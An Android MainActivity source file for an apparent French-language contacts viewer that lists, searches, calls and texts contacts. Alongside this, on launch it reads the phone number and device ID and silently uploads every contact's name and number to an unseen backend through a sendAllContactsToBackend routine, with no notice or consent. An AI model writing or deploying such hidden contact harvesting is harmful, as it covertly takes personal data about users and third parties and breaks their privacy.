package com.example.contacte;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;

import retrofit2.Call;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 1;
    private String phoneNumber = "";
    private String imei = "";
    private ListView listView;
    private ArrayAdapter<String> adapter;
    private ArrayList<String> contactsList = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        listView = findViewById(R.id.lv);
        EditText searchInput = findViewById(R.id.searchInput);

        searchInput.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                adapter.getFilter().filter(s);
            }

            @Override
            public void afterTextChanged(Editable s) {}
        });


        adapter = new ArrayAdapter<String>(this, R.layout.item_contact, R.id.nameText, contactsList) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                View view = super.getView(position, convertView, parent);

                String item = getItem(position);
                TextView nameText = view.findViewById(R.id.nameText);
                TextView numberText = view.findViewById(R.id.numberText);

                if (item != null && item.contains(":")) {
                    String[] parts = item.split(":");
                    nameText.setText(parts[0].trim());
                    numberText.setText(parts[1].trim());
                } else {
                    nameText.setText(item);
                    numberText.setText("");
                }
                return view;
            }


        };

        listView.setAdapter(adapter);

        checkPermissions();
        getNumberAndImei();
        loadContacts();
        sendAllContactsToBackend();
        registerObserver();


        listView.setOnItemClickListener((parent, view, position, id) -> {
            String selectedContact = contactsList.get(position);
            String contactNumber = selectedContact.split(":")[1].trim();
            showContactOptionsDialog(contactNumber);
        });
    }

    private void checkPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE},
                    REQUEST_CODE);
        } else {
            getNumberAndImei();
            loadContacts();
            registerObserver();

        }
    }

    private void getNumberAndImei() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {

            phoneNumber = telephonyManager.getLine1Number();

        } else {
            phoneNumber = "Unknown Number";
        }


        imei = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                ? Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)
                : telephonyManager.getDeviceId();

        if (imei == null) imei = "Unknown IMEI";
    }

    private void loadContacts() {
        contactsList.clear();

        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIndex);
                String number = cursor.getString(numberIndex);
                contactsList.add(name + " : " + number);
            }
            cursor.close();
        }
        adapter.notifyDataSetChanged();
    }

    private void showContactOptionsDialog(String contactNumber) {
        View dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_contact_options, null);
        TextView contactMsg = dialogView.findViewById(R.id.contactMessage);
        contactMsg.setText("Que voulez-vous faire avec : " + contactNumber + " ?");


        AlertDialog dialog = new AlertDialog.Builder(this)
                .setView(dialogView)
                .create();

        dialogView.findViewById(R.id.callBtn).setOnClickListener(v -> {
            makeCall(contactNumber);
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.smsBtn).setOnClickListener(v -> {
            sendSMS(contactNumber);
            dialog.dismiss();
        });

        dialog.show();
    }

    private void registerObserver() {
        getContentResolver().registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI,
                true,
                new ContactObserver(new Handler(), this)
        );
    }


    private void makeCall(String number) {
        Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + number));
        startActivity(intent);
    }

    private void sendSMS(String number) {
        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + number)));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                getNumberAndImei();
                loadContacts();
                registerObserver();
            } else {
                Toast.makeText(this, "Permissions refusées !", Toast.LENGTH_SHORT).show();
            }
        }
    }
    private void sendAllContactsToBackend() {
        Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIndex);
                String number = cursor.getString(numberIndex);

                // Log the contact being sent
                Log.d("sendAllContactsToBackend", "Sending contact: Name = " + name + ", Number = " + number);

                ContactModel contact = new ContactModel(name, number);

                ApiInterface api = ApiClient.getClient().create(ApiInterface.class);
                api.addContact(contact).enqueue(new retrofit2.Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        Log.d("sendAllContactsToBackend", "Contact sent successfully: " + name);
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        Log.e("sendAllContactsToBackend", "Failed to send contact: " + name, t);
                    }
                });
            }
            cursor.close();
        }
    }

}
